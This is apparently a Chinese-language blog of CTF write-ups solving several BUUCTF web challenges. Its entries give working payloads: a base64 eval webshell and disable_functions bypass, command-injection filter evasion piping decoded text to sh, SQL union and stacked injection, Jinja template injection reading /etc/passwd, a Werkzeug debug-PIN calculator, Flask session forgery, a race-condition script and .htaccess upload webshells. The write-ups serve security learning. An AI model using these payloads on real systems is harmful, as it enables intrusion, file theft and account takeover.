<h4 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h4><p>把 base64 编码后的命令传入<code>Ginkgo</code>后就可以执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw== #phpinfo();</span><br></pre></td></tr></table></figure>

<p>存在 disable_functions，禁用了一些执行系统命令的函数。本质上是一个黑名单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=phpinfo(); # @eval($_GET[&#x27;c&#x27;]);</span><br></pre></td></tr></table></figure>

<p>测试成功，使用蚁剑连接，发现根目录下的 flag，不可读。存在 readflag 二进制文件。</p>
<p>使用 Github 上的 PHP 7.0-7.3 disable_functions bypass，<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">项目地址</a>，使用 gc-bypass，修改其中的命令为 <code>/readflag</code>，上传至 <code>/tmp</code>，include 上传的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=include(&#x27;/tmp/exploit.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>得到 flag</p>
<h4 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h4><p>上传 .htaccess 修改类型，上传图片马，蚁剑连接。有个坑，蚁剑不能连 GET 的马。</p>
<h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure>

<p>存在.git泄露，得到源码。同时存在白名单和黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><p>命令执行，过滤了空格和很多特殊字符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?ip=1.1.1.1|ls //发现index.php和flag.php</span><br><span class="line">?ip=1.1.1.1|cat flag.php //发现过滤了空格</span><br><span class="line">?ip=1.1.1.1|cat&lt;flag.php //过滤了特殊字符</span><br><span class="line">?ip=1.1.1.1|cat$IFS$1flag.php //用$IFS$1代替空格,发现过滤了flag</span><br><span class="line">?ip=1.1.1.1|cat$IFS$1index.php //查看源码，发现过滤了特殊字符、bash、空格、flag</span><br><span class="line">?ip=1.1.1.1;a=g;cat$IFS$1fla$a.php //利用shell变量绕过flag的过滤</span><br><span class="line">?ip=1.1.1.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //用sh执行</span><br><span class="line">?ip=1.1.1.1;cat$IFS`ls` //内联执行，反引号内的命令输出作为输入			</span><br></pre></td></tr></table></figure>

<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p>试了一下，用户名的位置会报错，只过滤了括号，<code>=</code>和小写的<code>or</code>，页面里有注释，先 base32 再 base64，<code>select * from user where username = &#39;$name&#39;</code>。</p>
<p>有3列，试一下<code>admin&#39; union select 1,2,3%23</code>，提示wrong pass。是对输入的 pw 进行了 md5，然后查表中的数据，最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=rrrrrrrrrr&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27;%23&amp;pw=123</span><br></pre></td></tr></table></figure>

<p>其中<code>202cb962ac59075b964b07152d234b70&#39;%23</code>是 123 的MD5。</p>
<h4 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h4><p>phpMyadmin 任意文件包含</p>
<p>payload:<code>http://92909cd3-f955-4efa-99af-dc3d378a1ec6.node3.buuoj.cn/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</code></p>
<h4 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h4><p>check.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#x27;seed&#x27;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;num&#x27;]))&#123;</span><br><span class="line">    if($_POST[&#x27;num&#x27;]===$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">mt_rand()</a>漏洞，伪随机，可以爆破 seed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">str2 = &#x27;LTa1ZXoMsb&#x27;</span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27;</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>生成 <a target="_blank" rel="noopener" href="https://github.com/lepiaf/php_mt_seed">php_mt_seed</a> 所需的参数后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">time ./php_mt_seed 47 47 0 61 55 55 0 61 0 0 0 61 27 27 0 61 61 61 0 61 59 59 0 61 14 14 0 61 48 48 0 61 18 18 0 61 1 1 0 61</span><br></pre></td></tr></table></figure>

<p>爆破出 seed 之后重新生成 str，至少需要 PHP 7.2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(945888871);</span><br><span class="line"></span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h4><p>模板注入，加密页面输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>把结果放到解密页面解密，得到 2，存在模板注入。payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读取到文件，但是不知道 flag 位置，需要打开 debug 模式中的 python shell，需要获取 PIN 码</p>
<p>PIN 码由以下几个值计算得到：</p>
<ul>
<li>服务器运行 flask 的用户名，通过读取 /etc/passwd 得到，此题目为 flaskweb</li>
<li>modname，一般为 flask.app</li>
<li><code>getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</code>，一般为 Flask</li>
<li>flask 库下 app.py 的绝对路径，通过报错信息可以得到，本题目为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></li>
<li>当前网络 MAC 地址的十进制数，通过文件<code>/sys/class/net/eth0/address</code>得到</li>
<li>机器ID，一般在<code>/etc/machine-id</code>或者<code>/proc/sys/kerne/random/boot-i</code>，docker 容器在<code>/proc/sef/cgroup</code>，<code>name=systemd:/docker/</code>后面的一串就是ID</li>
</ul>
<p>计算 PIN 码，在<code>Lib\site-packages\werkzeug\debug\\_\_init__.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;flaskweb&#x27;, # 用户名</span><br><span class="line">    &#x27;flask.app&#x27;, # modname</span><br><span class="line">    &#x27;Flask&#x27;, # Flask</span><br><span class="line">    &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;, # app.py 路径</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485410412221&#x27;, # MAC 地址</span><br><span class="line">    &#x27;6743637069af7e10cfc09a74d23b62c700765cc89e2ae6d0f43150e839dde80e&#x27; # 机器ID</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>得到 PIN 码进入 python shell，使用 os 模块执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">os.popen(&#x27;cat /this_is_flag.txt&#x27;).read()</span><br></pre></td></tr></table></figure>



<h4 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h4><p>黑名单<code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>堆叠注入 + handler 代替 select</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show tables;# 查表</span><br><span class="line">1&#x27;; show columns from FlagHere;# 查列名</span><br><span class="line">1&#x27;; handler FlagHere open as aaaa; handler aaaa read first; handler aaaa close;# 利用 handler 代替 select 查询数据</span><br></pre></td></tr></table></figure>

<h4 id="HCTF-2018-warmup"><a href="#HCTF-2018-warmup" class="headerlink" title="[HCTF] 2018 warmup"></a>[HCTF] 2018 warmup</h4><p>代码审计，定义了白名单，判断file参数问号之前的内容是不是在白名单里。利用文件包含漏洞（CVE-2018-2613），<code>?file=hint.php?.././../../../../ffffllllaaaagggg</code>，其中问号可以url编码，效果一样。</p>
<h4 id="HCTF-admin"><a href="#HCTF-admin" class="headerlink" title="[HCTF] admin"></a>[HCTF] admin</h4><p>随便注册个账号，登录，在修改密码的地方发现一行注释，给了源码</p>
<p><strong>方法1：</strong> session伪造</p>
<p>flask将session存储在客户端（浏览器），并且不对session进行加密，只进行签名，不能防止session被读取，但可以防止被篡改，得到签名后可以伪造session</p>
<p>登录后看下自己的session，读取一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>

<p>拿到内容，在config.py发现密钥 ckj123，把得到的内容中的user改为admin，user_id改为1，伪造session（<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager%EF%BC%89%EF%BC%8C%E6%9B%BF%E6%8D%A2%E6%8E%89%E5%8E%9F%E6%9D%A5%E7%9A%84session%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0flag">https://github.com/noraj/flask-session-cookie-manager），替换掉原来的session就可以得到flag</a></p>
<p><strong>方法2：</strong>unicode欺骗</p>
<p>route.py的login函数和change函数里都有strlower这个操作，而不是正常的lower。</p>
<p>跟进一下，看到nodeprep.prepare，对应的库是twisted。</p>
<p>在requirements.txt中，twisted的版本是10.2.0，最新的是18，差距很大。查一下，这个函数会自动进行如下转换</p>
<p><code>ᴀ -&gt; A -&gt; a</code></p>
<p>于是我们注册ᴀ dmin，登录后变成Admin，改密码的时候就会改掉admin的密码，成功登录。</p>
<p><strong>方法3：</strong>条件竞争</p>
<p>在login和change函数中都没有进行检查，而是先赋值到name和session.name，在已有登录的session情况下，登录admin，修改密码，就可以修改掉admin的密码，但是login函数进行了判断，可以开双线程绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def login(s, username, password):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;: username,</span><br><span class="line">        &#x27;password&#x27;: password,</span><br><span class="line">        &#x27;submit&#x27;: &#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    return s.post(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/login&quot;, data=data)</span><br><span class="line"></span><br><span class="line">def logout(s):</span><br><span class="line">    return s.get(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/logout&quot;)</span><br><span class="line"></span><br><span class="line">def change(s, newpassword):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;newpassword&#x27;:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    return s.post(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/change&quot;, data=data)</span><br><span class="line"></span><br><span class="line">def func1(s):</span><br><span class="line">    login(s, &#x27;skysec&#x27;, &#x27;skysec&#x27;)</span><br><span class="line">    change(s, &#x27;skysec&#x27;)</span><br><span class="line"></span><br><span class="line">def func2(s):</span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, &#x27;admin&#x27;, &#x27;skysec&#x27;)</span><br><span class="line">    if &#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27; in res.text:</span><br><span class="line">        print(&#x27;finish&#x27;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ps：复现失败，预想的结果是会把admin的密码改为skysec，就可以登录。但实际上我可能是被buuctf给ban了</p>
<h4 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h4><p>Node.js 代码审计、弱类型、依赖库缺陷</p>
<p>static/js/app.js:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *  或许该用 koa-static 来处理静态文件</span><br><span class="line"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">function login() &#123;</span><br><span class="line">    const username = $(&quot;#username&quot;).val();</span><br><span class="line">    const password = $(&quot;#password&quot;).val();</span><br><span class="line">    const token = sessionStorage.getItem(&quot;token&quot;);</span><br><span class="line">    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)</span><br><span class="line">        .done(function(data) &#123;</span><br><span class="line">            const &#123;status&#125; = data;</span><br><span class="line">            if(status) &#123;</span><br><span class="line">                document.location = &quot;/home&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function register() &#123;</span><br><span class="line">    const username = $(&quot;#username&quot;).val();</span><br><span class="line">    const password = $(&quot;#password&quot;).val();</span><br><span class="line">    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)</span><br><span class="line">        .done(function(data) &#123;</span><br><span class="line">            const &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(&#x27;token&#x27;, token);</span><br><span class="line">            document.location = &quot;/login&quot;;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function logout() &#123;</span><br><span class="line">    $.get(&#x27;/api/logout&#x27;).done(function(data) &#123;</span><br><span class="line">        const &#123;status&#125; = data;</span><br><span class="line">        if(status) &#123;</span><br><span class="line">            document.location = &#x27;/login&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getflag() &#123;</span><br><span class="line">    $.get(&#x27;/api/flag&#x27;).done(function(data) &#123;</span><br><span class="line">        const &#123;flag&#125; = data;</span><br><span class="line">        $(&quot;#username&quot;).val(flag);</span><br><span class="line">    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示配置的静态目录是程序的根目录，可能存在任意文件读取，直接访问<code>/app.js</code>，得到源码。</p>
<h4 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id[]=1&amp;gg[]=2&amp;passwd[]=1234567</span><br><span class="line">passwd=1234567asdf</span><br></pre></td></tr></table></figure>

<p>md5 一个数组会返回 false，两个 false 相等。</p>
<p>利用弱类型，1234567asdf 转换为数字就是 1234567</p>
<h4 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h4><p>普通的文件上传，传文件时需要修改 content type</p>
<p>传一个 <code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>传一个 .jpg 格式的🐎就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>

